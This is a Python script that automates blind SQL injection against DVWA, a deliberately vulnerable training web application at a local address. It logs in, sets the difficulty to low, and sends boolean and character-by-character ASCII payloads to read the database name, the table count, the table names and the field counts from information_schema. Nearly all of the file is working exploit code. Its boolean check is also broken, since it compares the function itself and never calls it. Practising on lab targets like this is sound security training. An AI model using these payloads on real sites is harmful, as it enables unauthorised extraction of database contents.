"""
    Blind SQL injection in DVWA    
"""

import requests
import os
import sys
sys.path.insert(0,'../') # To import dvwa module
import dvwa
from logs import *
from bs4 import BeautifulSoup
"""
pip install bs4
pip install lxml
"""
def bool_check(resp):
    if "User ID is MISSING from the database" in resp.text:
        print_debug("Boolean : false")
        return False
    elif "User ID exists in the database" in resp.text:
        print_debug("Boolean : true")
        return True
    else:
        print_debug("Boolean : failed")
        return -1

def test_boolean_operator(sess, url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/"):
    pay = "1' and 1=1"

    payload = {
            "id":pay,
            "Submit":"Submit"
        }
    resp = sess.get(url, params=payload)
    if bool_check == False:
        print_warning("Boolean test failed at testing False")
        return False
    pay = "1' and 1=2"

    payload = {
            "id":pay,
            "Submit":"Submit"
        }
    resp = sess.get(url, params=payload)
    if bool_check == True:
        print_warning("Boolean test failed at testing True")
        return False
    else:
        return True

def sqli_find_numof_columns(sess, url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/"):
    out = 0
    i = 1
    while True:
        pay = "1' order by "
        pay += str(i)
        pay += "#"

        payload = {
            "id":pay,
            "Submit":"Submit"
        }

        resp = sess.get(url, params=payload)        
        if bool_check(resp) == False:
            out = i
            print_debug("Found number of columns : "+str(out))
            break
        i += 1
    return out
def sqli_find_len(sess, url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/", subject="database()"):
    out = 0
    i = 1
    while True:
        pay = "1' and length("
        pay += subject
        pay += ")="
        pay += str(i)
        pay += "#"
        payload = {
            "id":pay,
            "Submit":"Submit"
        }
        resp = sess.get(url, params=payload)        
        if bool_check(resp) == True:
            out = i
            print_debug("Found name length : "+str(out))
            break
        i += 1
    return out
def sqli_find_name(sess, len, url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/", subject="database()"):
    out = ""
    i = 0

    while i < len:
        pay = ""
        i += 1
        ascii_max = 255+1
    
        print_verbose("Current character : "+str(i))
        for j in range(ascii_max): # loop through all the ASCII values
            pay = " 1' and ascii(substr("
            pay += subject
            pay += "," + str(i)
            pay += "," + str(i)
            pay += "))="
            pay += str(j)
            pay += "#"

            payload = {
                "id":pay,
                "Submit":"Submit"
            }

            print_debug("\t"+str(j) + " : " + pay + " : " + chr(j))
            resp = sess.get(url, params=payload)
            if bool_check(resp): # if this index matches with this ascii value
                out += chr(j) # concatenate the output with the found ASCII character
                print_verbose("Character found : "+chr(j))
                break
    print_debug("Found name : "+out)
    return out
def sqli_find_tables_count(sess, subject="table_name", url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/"):
    out = 0
    i = 1
    while True:
        pay = "1' and (select count("
        pay += subject
        pay += ") from information_schema.tables where table_schema=database())="
        pay += str(i)
        pay += "#"
        payload = {
            "id":pay,
            "Submit":"Submit"
        }
        resp = sess.get(url, params=payload)        
        if bool_check(resp) == True:
            out = i
            print_debug("Found tables count : "+str(out))
            break
        i += 1
    return out
def sqli_find_table_length(sess, table_index, subject="table_name", url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/"):
    out = 0
    i = 1
    while True:
        pay = "1' and length(substr((select "
        pay += subject
        pay += " from information_schema.tables where table_schema=database() limit "
        pay += str(table_index)
        pay += ",1),1))="
        pay += str(i)
        pay += "#"
        payload = {
            "id":pay,
            "Submit":"Submit"
        }
        resp = sess.get(url, params=payload)        
        if bool_check(resp) == True:
            out = i
            print_debug("Found table length : "+str(out))
            break
        i += 1
    return out
def sqli_find_table_name(sess, len, table_index, url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/", subject="table_name"):
    out = ""
    i = 0

    while i < len:
        pay = ""
        i += 1
        ascii_max = 255+1
    
        print_verbose("Current character : "+str(i))
        for j in range(ascii_max): # loop through all the ASCII values
            pay = "1' and ascii(substr((select "
            pay += subject
            pay += " from information_schema.tables where table_schema=database() limit "
            pay += str(table_index)
            pay += ",1)"
            pay += "," + str(i)
            pay += "," + str(i)
            pay += "))="
            pay += str(j)
            pay += "#"

            payload = {
                "id":pay,
                "Submit":"Submit"
            }

            print_debug("\t"+str(j) + " : " + pay + " : " + chr(j))
            resp = sess.get(url, params=payload)
            if bool_check(resp): # if this index matches with this ascii value
                out += chr(j) # concatenate the output with the found ASCII character
                print_verbose("Character found : "+chr(j))
                break
    print_debug("Found name : "+out)
    return out
def sqli_find_table_fields_count(sess, table_name, subject="table_name", url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/"):
    out = 0
    i = 1
    while True:
        pay = "1' and (select count(column_name) from information_schema.columns where "
        pay += subject
        pay += "="
        pay += '"' + table_name + '"'
        pay += ")="
        pay += str(i)
        pay += "#"
        payload = {
            "id":pay,
            "Submit":"Submit"
        }
        resp = sess.get(url, params=payload)        
        if bool_check(resp) == True:
            out = i
            print_debug("Found table fields count : "+str(out))
            break
        i += 1
    return out

def exploit_low(sess):
    # SQL injection
    test_boolean_operator(sess)
    ## Determine number of columns
    #exploit_num_columns = sqli_find_numof_columns(sess)
    #print_success("Found table columns number : "+str(exploit_num_columns))
    ## Determine the length of the database name
    #expoit_len_db_name = sqli_find_len(sess, subject="database()")
    #print_success("Found database name length : "+str(expoit_len_db_name))
    ## Determine name of the database
    # 1' and ascii(substr(database(),<index>,<index>))
    #exploit_db_name = sqli_find_name(sess, expoit_len_db_name, subject="database()")
    #print_success("Found database name : "+exploit_db_name)
    ## Determine tables count
    exploit_tables_count = sqli_find_tables_count(sess)
    print_success("Found tables count in database : "+str(exploit_tables_count))

    exploit_table_index = 1

    exploit_table_name_len = sqli_find_table_length(sess, exploit_table_index)
    print_success("Found table "+str(exploit_table_index)+" name length : "+str(exploit_table_name_len))

    exploit_table_name = sqli_find_table_name(sess, exploit_table_name_len, exploit_table_index)
    print_success("Found table "+str(exploit_table_index)+" name : "+exploit_table_name)

    exploit_table_fields_count = sqli_find_table_fields_count(sess, exploit_table_name)
    print_success("Found table "+str(exploit_table_index)+" fields count : "+str(exploit_table_fields_count))

def main():
    sess = requests.Session()
    sess = dvwa.login_dvwa(sess, "http://192.168.1.73/dvwa/login.php")
    sess = dvwa.set_dvwa_difficulty(sess, "http://192.168.1.73/dvwa/security.php", "low")
    
    exploit_low(sess)

main()